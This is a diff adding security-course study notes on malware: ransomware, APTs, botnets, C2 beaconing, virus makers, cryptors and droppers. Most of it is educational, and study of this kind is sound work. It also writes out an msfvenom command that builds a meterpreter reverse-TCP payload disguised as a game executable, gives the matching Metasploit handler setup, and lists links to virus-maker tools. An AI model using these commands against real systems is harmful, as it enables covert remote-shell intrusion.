@@ -580,9 +580,236 @@ Fileless Example:
 ##### Logic Bomb : 
 executes a program when certain event happens or a date and time arrives
 ##### Cryptominning malware
-Currently the predominant global malware threat
-Heavily utilizes the compromised machines resources to mine cryptocurrency
-Infects desktop computer, laptops and even mobile phone and IoT devices
+- Currently the predominant global malware threat
+- Heavily utilizes the compromised machines resources to mine cryptocurrency
+- Infects desktop computer, laptops and even mobile phone and IoT devices
+
+#### MOBILE malware
+- Malicious software specifically designed to target mobile devices
+- Goal is to gain access to private data
+- Common types of mobile malware include RATs, bank trojans, ransomware, cryptominning malware, advertising click fraud.
+- Most commonly distributed through mobile phishing and spoofing, jailbroken/rooted devices
+
+
+### 7.6 ADVANCE PERSISTENT THREATS
+
+-  A general term that can refer to group of attackers or the methods they use
+- MITRE ATT&CK currently track 135 APTs
+	- Most have been assigned an APT number and are known by multiple names
+	- The vast majority are from China, Russia, IRAN and North Korea
+	- There are also a few from Vietnam, south America, Israel, Lebenon, the middle east and south Korea and the united states
+- APT groups are sophisticated and well-funded (usually by nation states)
+- Recent APT activities
+	- COVID relief funds theft
+	- Cryptocurrency theft
+	- Money laundering
+	- Government and defense contractor infiltration
+	- Private sector / vertical industry infiltration
+	- Supply chain infiltration
+	- Data exfiltration
+	- Targeted DDoS
+- APTs rely heavily on social engineering, as well as software tools
+
+#### RANSOMWARE
+
+- AKA Data hiding or encryption Trojan
+- Malicious software designed to deny access to a computer until a price is paid
+- Typically encrypts files (near the entire drive) using RSA 1024 -2048 public key
+	- The private key is on the attacker's C&C server
+- Th e victim must pay a ransom for the attacker to provide the decryption key
+	- No guarantee the key will actually be provided
+	- Payment sites are typically on the TOR Network
+- Usually spread through email
+	- Most are trojans
+	- Most add entries to the windows registry for persistence
+- Example: WannCry
+	- Famous rasnsomware
+	- Within 24 hours had 230000 victims
+	- Exploited unpatched SMB vulnerability
+
+#### RAMSOMEWARE TYPES
+- CryptorBit
+	- Corrupts the first 213 or 1024 bytes of any data file it finds
+	- Able to bypass Group Policy settings put in place to defend against this type of infection
+	- Masquerades as legitimate antivirus software or update for popular software titles like adobe flash
+- CryptoLocker
+	- Similar to CryptoBit
+	- Encrypts files, offering to decrypt if a payment is made by stated deadline
+- CryptoDefense
+	- AKA HOW_DECRYPT.txt Ransomware
+	- Installs via malicious Flash or other online video players
+	- Encrypts data files such as text fyles, image files, video files and office documents
+- CryptoWall Ransomware
+	- Easy and inexpensive for the attacker to use
+- Police-Themed Ransomware
+	- Appears as a warning from local law enforcement authority
+	- Accuses the user of possessing pornographic or illegally downloaded material
+	- Requires the user to pay a fine or be subject to arrest
+
+> In 2022, Chinese APTs used short-lived ransomware campaigns to mask espionage:
+> 	APT 41: Deployed QuasarRAT, PlugX and Cobalt Strike to steak intellectual property from Japanese firms
+> 	APT 10: Used Cobalt Strike to deploy ransomware such as Rook, Pandora, AtomSilo, LockFile and Night Sky to attack Western global organization.
+
+#### WHAT IS BOTNET?
+- `A network of compromised Zombie computers
+- Command and Control computers manage the zombies
+	- Can be controlled over HTTP, HTTPS, IRC or ICQ
+- Used to start a distributed attack
+- Botnets can be instructed to do malicious tasks including
+	- Distributed denial-or-service (DDoS)
+	- Sending Spam
+	- Delivering ransomware
+	- Bitcoin Mining
+
+#### ZOMBIES
+- A Computer connected to the internet
+	- Compromised by a hacker, computer virus or trojans horse program
+- Can be used to perform various malicious tasks under remote direction
+
+> There are many MaaS (Malware-as-a-Service) providers available on the Internet . AKA Rent-a-Botnet. Service offering inexpensive botnets for hire.
+
+#### BOTNET C2 Beaconing
+- AKA C&C beaconing
+- A zombie will periodically check in with its C&C server
+	- Typically on a regular interval
+- This is known as beaconing
+- Beaconing has pattern that diffrentiuates it from normal traffic
+	- Regularity of its intervals
+- Beaconing on common ports and protocols (such as HTTP:80 or HTTPS: 443) bobscures malicious traffic within normal traffic
+- Helps the attacker evade firewalls
+- Another evasion tactic involves waiting long, randomized periods of time before communicating
+- The beaconing will continue until:
+	- The zombie receives instruction to attack
+	- the infection is cleaned
+
+#### BOTNET TROJAN
+- Malware used to turn a computer into a zombie
+- The zombie will start beaconing to regularly check in with its C2 server
+- When the zombie receives commands from the C2 server it will join others to launch a coordinated attack
+	
+#### HIT-LIST Scanning
+- A way to accelerate the initial spread of a worm:
+	- can abe used to rapidly build your botnet
+- Start with low and slow scanning to create a hit list of vulnerable machines
+- Start the worm -pass it the list
+- Pass part of the list to each new infected machine
+- Infected machines can also create new lists
+- The scanning / infecting process will hits a threshold where increase exponentially
+
+#### BOTNET TROJAN EXAMPLES
+#Trickbot  #Mirai #Gafgyt #Meris
+
+
+#### Scenario 1 : Botnet
+Your IDS has alerted you that its sensor continuously observer well-known call home messages at the network boundary
+You proxy firewall is properly configured to successfully drop the messags before leaving the network
+Which of the following is MOST likely the cause of the call home messages being sent?
+Answer:  Probably a #zombie . A call home message is an indicator of a zombie beaconing to see if it has instruction from its C2 Server.
+
+#### Scenario 2: Botnet
+Company uses the subnet range if 192.168.0.0/8
+While monitoring the data, you see a high number of outbound connections
+XYZ internal IP addresses are making connections to a public IP Address
+After doing some research you find that the public IP is a blacklisted IP and the internal communication devices are compromized
+What kind of attack does the above scenario depict?
+
+
+### 7.7 MALWARE MAKERS
+
+#### Examples : Virus Maker
+
+
+| Description                | Portals                                                                         |
+| -------------------------- | ------------------------------------------------------------------------------- |
+| BlackHost Virus MAker      | https://www.blackhost.xyz?id=vm                                                 |
+| Bhavesh Virus Maker        | https://sourceforge.net/projects/bhavesh-virus-maker                            |
+| Virus maker 4.0            | https://virus-maker-software.informer.com/4.0                                   |
+| Heavenlyzy Virus Maker 3.0 | https://heavenlyzy.weebly.com/blog/virus-maker-30                               |
+| Github                     | 84 repos for virus maker<br>7 repos for worm maker<br>8 repos for trojan makers |
+|                            |                                                                                 |
+
+#### WRAPPER
+- A wrapper hides a trojan inside a legitimate application
+- Could be a game, productivity app or utility
+- When the user installation application
+	- The legitimate apps run in the foreground
+	- The trojan runs in the background
+- Wrapper examples:
+	- Mpge
+	- Seena Spy One Exe Maker 2000
+	- Dark Horse Trojan Virus Maker
+- Most trojan makers have build-in wrapper functionality
+
+
+
+
+#### CRYPTOR
+- Software that uses encryption and obfuscation to make malware harder to recognize
+- The goal is to bypass detection by antimalware programs
+- Types of Cryptors
+	- Statics/Statistical cryptors
+		- Use different stubs to make each encrypted file unique
+		- Having a separate for each client makes it easier for malicious actors to modify or in hacking terms, Clean a stub once it has been detected by a security software
+	- Polymorphic cryptors
+		- Considered more advanced
+		- Use state-of-the-art algorithms that utilize random variables, data, keys, decoders and so on
+		- One input source file never produces an output file that is identical to the output of another source file
+	- Cryptor Service are available online for reasonable fee ($10 - 100)
+- Cryptor Examples
+	- msfvenom
+	- AIO FUD crypter
+	- hidden sight crypter
+	- Galaxy Cryptor
+	- Criogenic crypter
+	- Heaven crypter
+	- Swayz Cryptor
+	- Aegis  Cryptor
+	- GitHub Lists 33 malware cryptor repositories
+
+#### DROPPER
+- AKA Stager
+- A king of Trojan Designed to install malware to a computer
+- Can be thought of as an "advance party"
+	- Small in size
+	- Usually does not itself contain the malware
+	- Gains a foothold in the target
+	- Then downloads the larger malware file
+- Persistent dropper
+	- Hides itself on the target
+	- Modifies registry keys
+	- Runs with every reboots
+- Non-persistent dropper
+	- Remotes itself after executing its payload
+
+##### DROPPER EXAMPLES
+- msfvenom
+- nullmixer
+- Github 63 malware Dropper repositories
+
+#msfvenom can be used to create a trojan dropper / stager/ downloader . It payload platform specific to the intended target. It has a build-in obfuscation features to evade detection by the target's antivirus. It replaces the old MSFencode feature
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=hostname LPORT=4444 -f exe -a x64 -o /root/Desktop/awesome-game.exe
+
+
+\\ dropper connect to its handler, and then downloads the stage (real exploit) and attacker has a setup of handler in metasploit waiting to connected by msfvenom.
+
+metasploit
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST $hostname
+show options
+run
+```
+
+#### Exploit kit
+- AKA Crimeware kit
+- A platform you can use to create and deliver exploits and payloads
+- Examples:
+	- Infinity Exploit Kit
+		- Uses vulnerabilities of Mozilla Firefox, internet explorer and opera to install malware on a target computer
+		- 
+
+
 
 
 
